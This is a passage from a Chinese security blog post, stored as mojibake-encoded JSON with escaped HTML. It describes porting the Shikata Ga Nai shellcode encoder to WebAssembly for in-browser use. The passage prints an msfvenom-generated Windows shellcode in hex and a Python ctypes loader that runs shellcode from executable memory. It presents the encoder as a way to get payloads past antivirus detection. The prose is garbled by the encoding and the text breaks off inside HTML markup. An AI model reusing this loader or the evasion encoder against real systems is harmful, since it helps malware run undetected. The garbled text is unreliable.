ks.Call(\u0026#34;option\u0026#34;, GetKeystone().Get(\u0026#34;OPT_SYNTAX\u0026#34;), GetKeystone().Get(\u0026#34;OPT_SYNTAX_INTEL\u0026#34;)) //log.Println(asm) v := ks.Call(\u0026#34;asm\u0026#34;, asm) if !v.Truthy() { return -1 } ok := v.Get(\u0026#34;failed\u0026#34;).Bool() if !ok { return -1 } if !v.Get(\u0026#34;mc\u0026#34;).Truthy() { return -1 } return v.Get(\u0026#34;mc\u0026#34;).Length() } å¯ä»¥çœ‹åˆ°åŸºæœ¬ä¸Šå°±æ˜¯ä½¿ç”¨ syscall/js åº“æŒ‰ç…§ keystone.js çš„æ–‡æ¡£å†æŠŠåŸå…ˆçš„å®ç°ä¸€éã€‚\nç°åœ¨å¯ä»¥ç¼–è¯‘åˆ°wasmäº† GOARCH=wasm GOOS=js go build -trimpath -ldflags=\u0026quot;-s -w\u0026quot;\nç„¶åå¯ä»¥ä½¿ç”¨ https://github.com/golang/go/blob/master/misc/wasm/go_js_wasm_exec è¿è¡Œæµ‹è¯•ä¸‹ï¼Œæˆ‘è¿™é‡Œå°±ä¸åšäº†ã€‚\napiæš´éœ² æˆ‘ä»¬jsè°ƒç”¨wasmåº“ï¼Œè‚¯å®šéœ€è¦ä¸€ä¸ªapiå…¥å£ï¼Œæˆ‘ä»¬å¯ä»¥å°†sgnçš„mainå…¥å£æ”¹é€ ä¸€ä¸‹\ngoç¼–è¯‘åˆ°wasmåéœ€è¦ä¸€ä¸ªç‰¹æ®Šçš„jsæ–‡ä»¶åŠ è½½ä¸‹ï¼Œå…·ä½“éœ€è¦ https://github.com/golang/go/blob/master/misc/wasm/wasm_exec.js\nç›¸å…³æ ·ä¾‹å¯ä»¥æŸ¥çœ‹golangå®˜æ–¹ç¤ºä¾‹ https://github.com/golang/go/blob/master/misc/wasm/wasm_exec.html\nç„¶åæˆ‘ä»¬å¯ä»¥å°†mainå‡½æ•°æ”¹å†™ä¸€ä¸‹\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 func sgnExec(arch, encCount, obsLevel int, encDecoder, asciPayload, saveRegisters bool, badChars, input string) map[string]interface{} { var res = map[string]interface{}{ \u0026#34;err\u0026#34;: nil, \u0026#34;result\u0026#34;: nil, } source, err := hex.DecodeString(strings.ReplaceAll(input, `\\x`, \u0026#34;\u0026#34;)) if err != nil { res[\u0026#34;err\u0026#34;] = err return res } payload := []byte{} encoder := sgn.NewEncoder() encoder.ObfuscationLimit = obsLevel encoder.PlainDecoder = encDecoder encoder.EncodingCount = encCount encoder.SaveRegisters = saveRegisters eror(encoder.SetArchitecture(arch)) if badChars != \u0026#34;\u0026#34; || asciPayload { badBytes, err := hex.DecodeString(strings.ReplaceAll(badChars, `\\x`, \u0026#34;\u0026#34;)) eror(err) for { p, err := encode(encoder, source) eror(err) if (asciPayload \u0026amp;\u0026amp; isASCIIPrintable(string(p))) || (len(badBytes) \u0026gt; 0 \u0026amp;\u0026amp; !containsBytes(p, badBytes)) { payload = p break } encoder.Seed = (encoder.Seed + 1) % 255 } } else { payload, err = encode(encoder, source) eror(err) } res[\u0026#34;result\u0026#34;] = hex.EncodeToString(payload) return res } sgnExec å®ç°äº†åŸå…ˆmainçš„åŠŸèƒ½ï¼Œåªæ˜¯æŠŠå‘½ä»¤è¡Œå‚æ•°æ”¹ä¸ºäº†å‡½æ•°å‚æ•°ä¼ å…¥ï¼Œç„¶åæˆ‘ä»¬æŠŠè¿™ä¸ªå‡½æ•°æš´éœ²ç»™jsï¼Œéœ€è¦ä¸º sgnExec å‡½æ•°å¥—ä¸€ä¸ªå£³ï¼Œä» args[0] è·å–å…¥å‚ï¼Œè®¡ç®—ç»“æœç”¨ js.ValueOf åŒ…è£…ï¼Œå¹¶è¿”å›ã€‚\n1 2 3 4 5 6 7 8 9 10 11 func sgnFunc(this js.Value, args []js.Value) interface{} { arch := args[0].Int() encCount := args[1].Int() obsLevel := args[2].Int() encDecoder := args[3].Bool() asciPayload := args[4].Bool() saveRegisters := args[5].Bool() badChars := args[6].String() input := args[7].String() return js.ValueOf(sgnExec(arch, encCount, obsLevel, encDecoder, asciPayload, saveRegisters, badChars, input)) } è¯¥å‡½æ•°å°†jsä¼ å…¥çš„å‚æ•°è¿›è¡Œè½¬æ¢ç„¶åè°ƒç”¨sgnExecå¹¶å°†ç»“æœè¿”å›\nç„¶åæˆ‘ä»¬ä½¿ç”¨ js.Global().Set() æ–¹æ³•ï¼Œå°†å‡½æ•° sgnFunc æ³¨å†Œåˆ°å…¨å±€ï¼Œä»¥ä¾¿åœ¨æµè§ˆå™¨ä¸­èƒ½å¤Ÿè°ƒç”¨ã€‚\n1 2 3 4 5 func main() { done := make(chan int, 0) js.Global().Set(\u0026#34;sgnFunc\u0026#34;, js.FuncOf(sgnFunc)) \u0026lt;-done } ç°åœ¨å¯ä»¥å¯¼å…¥è¿™ä¸ªwasmï¼Œç„¶åé€šè¿‡jsæ¥è°ƒç”¨å‡½æ•° sgnFunc äº†ã€‚å¯ä»¥æŒ‰ç…§å‰é¢ç»™å‡ºçš„golangå®˜æ–¹ç¤ºä¾‹å†™ä¸€ä¸ªç®€é™‹çš„å‰ç«¯ã€‚ä¸‹é¢ä¼šç»™å‡ºä¸€ä¸ªlive demo\næµ‹è¯• é¦–å…ˆæˆ‘ä»¬å…ˆç”Ÿæˆä¸€ä¸ªshellcodeï¼Œè¿™é‡Œæˆ‘ç›´æ¥ä½¿ç”¨msf\n1 2 3 4 5 6 7 $ ./msfvenom -p windows/x64/exec CMD=calc.exe -f hex [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload [-] No arch selected, selecting arch: x64 from the payload No encoder specified, outputting raw payload Payload size: 276 bytes Final size of hex file: 552 bytes fc4883e4f0e8c0000000415141505251564831d265488b5260488b5218488b5220488b7250480fb74a4a4d31c94831c0ac3c617c022c2041c1c90d4101c1e2ed524151488b52208b423c4801d08b80880000004885c074674801d0508b4818448b40204901d0e35648ffc9418b34884801d64d31c94831c0ac41c1c90d4101c138e075f14c034c24084539d175d858448b40244901d066418b0c48448b401c4901d0418b04884801d0415841585e595a41584159415a4883ec204152ffe05841595a488b12e957ffffff5d48ba0100000000000000488d8d0101000041ba318b6f87ffd5bbf0b5a25641baa695bd9dffd54883c4283c067c0a80fbe07505bb4713726f6a00594189daffd563616c632e65786500 ç„¶åæˆ‘ä»¬å¿«é€Ÿå†™ä¸ªpyè„šæœ¬æ‰§è¡Œæµ‹è¯•ä¸‹shellcode\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 import ctypes import sys shellcode = bytes.fromhex(sys.argv[1].strip()) shellcode = bytearray(shellcode) # è®¾ç½®VirtualAllocè¿”å›ç±»å‹ä¸ºctypes.c_uint64 ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64 # ç”³è¯·å†…å­˜ ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000), ctypes.c_int(0x40)) # æ”¾å…¥shellcode buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode) ctypes.windll.kernel32.RtlMoveMemory( ctypes.c_uint64(ptr), buf, ctypes.c_int(len(shellcode)) ) # åˆ›å»ºä¸€ä¸ªçº¿ç¨‹ä»shellcodeé˜²æ­¢ä½ç½®é¦–åœ°å€å¼€å§‹æ‰§è¡Œ handle = ctypes.windll.kernel32.CreateThread( ctypes.c_int(0), ctypes.c_int(0), ctypes.c_uint64(ptr), ctypes.c_int(0), ctypes.c_int(0), ctypes.pointer(ctypes.c_int(0)) ) # ç­‰å¾…ä¸Šé¢åˆ›å»ºçš„çº¿ç¨‹è¿è¡Œå®Œ ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-1)) ç„¶åè¿è¡Œä¸‹åŸå§‹çš„shellcode\nå¯ä»¥çœ‹åˆ°å¼¹å‡ºäº†è®¡ç®—å™¨\nç„¶åæˆ‘ä»¬æ”¾åœ¨é¡µé¢ä¸Šç¼–ç æ··æ·†ä¸€ä¸‹\nç„¶åè¿è¡Œä¸€ä¸‹\nå¯ä»¥çœ‹åˆ°ï¼ŒshellcodeåŠŸèƒ½æ­£å¸¸ã€‚\nLive Demo å¦‚æœå¤§å®¶æƒ³åœ¨çº¿ä½“éªŒä¸€ä¸‹ï¼Œå¯ä»¥åˆ° https://www.hacktech.cn/sgn-html/ ä½“éªŒä¸€ä¸‹ã€‚\nReference Shikata Ga Nai Encoder Still Going Strong\ngithub.com/EgeBalci/sgn\nGo WebAssembly (Wasm) ç®€æ˜æ•™ç¨‹\nhttps://github.com/therecipe/qt/blob/master/qt_wasm.go\nHow does CGO + WASM work?\n","permalink":"https://www.hacktech.cn/post/shikata-ga-nai-to-wasm.html","summary":"\u003ch2 id=\"shikata-ga-naiæ˜¯ä»€ä¹ˆ\"\u003eShikata ga naiæ˜¯ä»€ä¹ˆ\u003c/h2\u003e\n\u003cp\u003eMetasploit-Frameworkæ˜¯ä¸€ä¸ªæ¼æ´åˆ©ç”¨æ¡†æ¶ï¼Œé‡Œé¢æœ‰å¤§é‡çš„æ¼æ´åº“ï¼Œé’ˆå¯¹shellcodeä¸€äº›æ··æ·†ç¼–ç å™¨å¯ä»¥è®©ç”¨æˆ·bypassä¸€äº›å®‰å…¨è½¯ä»¶ï¼Œå…¶ä¸­ä¸€ä¸ªæ¯”è¾ƒæ ¸å¿ƒçš„ç¼–ç å™¨æ˜¯Shikata Ga Nai (SGN)ã€‚\u003c/p\u003e\n\u003cp\u003eshellcode ä¸»è¦æ˜¯æœºå™¨ç ï¼Œä¹Ÿå¯ä»¥çœ‹ä½œä¸€æ®µæ±‡ç¼–æŒ‡ä»¤ã€‚Metasploit åœ¨é»˜è®¤é…ç½®ä¸‹å°±ä¼šå¯¹payloadè¿›è¡Œç¼–ç ã€‚è™½ç„¶ Metasploit æœ‰å„ç§ç¼–ç å™¨ï¼Œä½†æœ€å—æ¬¢è¿çš„æ˜¯ SGNã€‚æ—¥è¯­ä¸­çš„çŸ­è¯­ SGN çš„æ„æ€æ˜¯â€œæ— èƒ½ä¸ºåŠ›â€ï¼Œä¹‹æ‰€ä»¥è¿™æ ·è¯´ï¼Œæ˜¯å› ä¸ºå®ƒåœ¨åˆ›å»ºæ—¶ä¼ ç»Ÿçš„åç—…æ¯’äº§å“éš¾ä»¥æ£€æµ‹ã€‚\u003c/p\u003e\n\u003cp\u003eæ£€æµ‹ SGN ç¼–ç çš„payloadå¾ˆå›°éš¾ï¼Œå°¤å…¶æ˜¯åœ¨ä¸¥é‡ä¾èµ–é™æ€æ£€æµ‹çš„æƒ…å†µä¸‹ã€‚ä»»ä½•åŸºäºè§„åˆ™çš„é™æ€æ£€æµ‹æœºåˆ¶åŸºæœ¬ä¸Šéƒ½æ— æ³•æ£€æµ‹åˆ°ç”¨ SGN ç¼–ç çš„payloadã€‚è€Œä¸æ–­æ‰«æå†…å­˜çš„è®¡ç®—æˆæœ¬å¾ˆé«˜ï¼Œå› æ­¤ä¸å¤ªå¯è¡Œã€‚è¿™ä½¿å¾—å¤§å¤šæ•°æ€è½¯ä¾èµ–äºè¡Œä¸ºæŒ‡æ ‡å’Œæ²™ç®±è¿›è¡Œæ£€æµ‹ã€‚\u003c/p\u003e\n\u003ch2 id=\"ä¸ºä»€ä¹ˆè¯´å¸¦åˆ°å‰ç«¯\"\u003eä¸ºä»€ä¹ˆè¯´å¸¦åˆ°å‰ç«¯\u003c/h2\u003e\n\u003cp\u003eé¦–å…ˆä»‹ç»ä¸‹ \u003ca href=\"https://github.com/EgeBalci/sgn\"\u003eEgeBalci/sgn\u003c/a\u003eï¼Œè¿™ä¸ªé¡¹ç›®å°†msfçš„Shikata Ga Naiç¼–ç å™¨ç§»æ¤åˆ°äº†Golangï¼Œä½¿å¾—ç”¨æˆ·å¯ä»¥ä¸é€šè¿‡msfå³å¯äº«å—åˆ°SGNçš„èƒ½åŠ›ã€‚\u003c/p\u003e\n\u003cp\u003eæ—¢ç„¶è¿™ä¸ªé¡¹ç›®æ˜¯éå¹³å°ä¾èµ–çš„å·¥å…·ï¼Œé‚£æˆ‘ä»¬å¯ä»¥è€ƒè™‘å°†å®ƒç§»æ¤åˆ°å‰ç«¯ï¼Œè¿™æ ·ç”¨æˆ·åªéœ€è¦æ‰“å¼€æµè§ˆå™¨å°±èƒ½ç”¨äº†ã€‚\u003c/p\u003e\n\u003ch2 id=\"ç§»æ¤æ€è·¯\"\u003eç§»æ¤æ€è·¯\u003c/h2\u003e\n\u003cp\u003eé¦–å…ˆæˆ‘ä»¬å¯ä»¥è€ƒè™‘ï¼šsgnæ˜¯ä¸€ä¸ªgolangé¡¹ç›®ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç¼–è¯‘åˆ°wasmï¼Œç„¶åæš´éœ²apiç»™javascriptæ¥è°ƒç”¨ï¼Œè¿™æ ·å°±å¯ä»¥å®ç°å‰ç«¯ä½¿ç”¨sgnäº†ã€‚\u003c/p\u003e\n\u003cp\u003eä½†æ˜¯é‡åˆ°äº†ä¸€äº›é—®é¢˜ã€‚\u003c/p\u003e\n\u003cp\u003eè¯¥é¡¹ç›®å¹¶ä¸æ˜¯ä¸€ä¸ªPure Goé¡¹ç›®ï¼Œå®ƒä¾èµ–cgoï¼Œæ²¡åŠæ³•ç¼–è¯‘åˆ°wasmã€‚\u003c/p\u003e\n\u003cp\u003eä½†æ˜¯æˆ‘è®°å¾— \u003ca href=\"https://github.com/therecipe/qt\"\u003egithub.com/therecipe/qt\u003c/a\u003e å¯ä»¥ç¼–è¯‘åˆ°wasmï¼Œé€šè¿‡ä¸€äº›ç ”ç©¶ï¼Œå‘ç°å®ƒæ˜¯é‡‡ç”¨äº†go-js-qtçš„æ¡¥æ¥ï¼Œqtæ˜¯å¯ä»¥ç¼–è¯‘åˆ°wasmçš„ï¼Œgoä¹Ÿå¯ä»¥ç¼–è¯‘åˆ°wasmï¼Œç„¶åä¸¤è€…ä¹‹é—´å†æ¡¥æ¥èµ·æ¥ã€‚é‚£æˆ‘ä»¬å¯ä»¥å°è¯•å…ˆå°† \u003ca href=\"http://github.com/keystone-engine/keystone\"\u003egithub.com/keystone-engine/keystone\u003c/a\u003e ç¼–è¯‘åˆ°wasmï¼Œç„¶åå°†sgné¡¹ç›®é‡Œé¢è°ƒç”¨cgoçš„åœ°æ–¹å…¨éƒ¨ä½¿ç”¨ syscall/js æ¡¥æ¥åˆ°keystoneä¸Šå»ï¼Œæ­¤æ—¶sgnå˜æˆäº†ä¸€ä¸ªPure Goé¡¹ç›®ï¼Œå¯ä»¥å°†å…¶ç¼–è¯‘åˆ°wasmäº†ï¼Œç„¶åå†æš´éœ²å‡ºä¸€ä¸ªæ¥å£å°±å¯ä»¥ä¾›jsä½¿ç”¨äº†\u003c/p\u003e\n\u003ch2 id=\"å®ç°æ‰‹æ®µ\"\u003eå®ç°æ‰‹æ®µ\u003c/h2\u003e\n\u003ch3 id=\"cgoåˆ°æ¡¥æ¥\"\u003ecgoåˆ°æ¡¥æ¥\u003c/h3\u003e\n\u003cp\u003esgné‡Œé¢éœ€è¦ä½¿ç”¨cgoæ˜¯å› ä¸ºä¾èµ– \u003ca href=\"https://github.com/EgeBalci/keystone-go\"\u003egithub.com/EgeBalci/keystone-go\u003c/a\u003eï¼Œçœ‹äº†ä¸€ä¸‹è¿™ä¸ªé¡¹ç›®ï¼Œå…¶å®æ˜¯keystoneçš„åŒ…è£…ï¼Œkeystoneæ˜¯ä¸€ä¸ªc++å†™çš„é¡¹ç›®ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥è€ƒè™‘ä½¿ç”¨ \u003ca href=\"https://emscripten.org/\"\u003eemscripten\u003c/a\u003e æ¥å°†keystoneç¼–è¯‘åˆ°wasmï¼Œä¸è¿‡è¯¥é¡¹å·¥ä½œå·²ç»æœ‰äººåšäº†ï¼Œæˆ‘ä»¬åœ¨è¿™è¾¹å°±ä¸è‡ªå·±å†èŠ±æ—¶é—´æ­ç¯å¢ƒç¼–è¯‘äº†ï¼Œå¯ä»¥çœ‹çœ‹ \u003ca href=\"https://alexaltea.github.io/keystone.js/\"\u003ealexaltea.github.io/keystone.js\u003c/a\u003e/\u003c/p\u003e\n\u003cp\u003eç„¶åæˆ‘ä»¬çœ‹çœ‹sgné‡Œé¢ä¾èµ–cgoçš„åœ°æ–¹ï¼Œä¸»è¦æ˜¯åœ¨ pkg/sgn.go\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cdiv style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\n\u003ctable style=\"border-spacing:0;padding:0;margin:0;border:0;\"\u003e\u003ctr\u003e\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e 1\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e 2\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e 3\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e 4\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e 5\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e 6\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e 7\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e 8\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e 9\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e10\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e11\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e12\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e13\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e14\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e15\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e16\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e17\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e18\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e19\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e20\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e21\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e22\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e23\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e24\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e25\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e26\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e27\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e28\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e29\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e30\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e31\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e32\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e33\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e34\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e35\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e36\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e37\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e38\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e39\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e40\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e41\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e42\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e43\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e44\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e45\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e46\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e47\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e48\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e49\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e50\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e51\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e52\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e53\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e54\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e55\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e56\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e57\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e58\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e59\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e60\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e61\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e62\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e63\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e64\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e65\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e66\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e67\n\u003c/span\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e68\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\n\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;;width:100%\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003epackage\u003c/span\u003e \u003cspan 